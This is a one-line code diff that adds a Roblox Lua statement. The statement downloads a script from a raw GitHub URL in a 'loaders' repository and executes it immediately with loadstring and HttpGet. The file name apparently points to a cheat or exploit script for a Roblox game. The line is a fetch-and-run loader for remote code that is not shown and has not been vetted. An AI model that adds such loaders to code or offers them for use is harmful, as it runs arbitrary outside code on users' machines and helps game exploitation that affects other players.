@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/slayers-2-spam0-5g43eo40m8m3y6.lua"))()
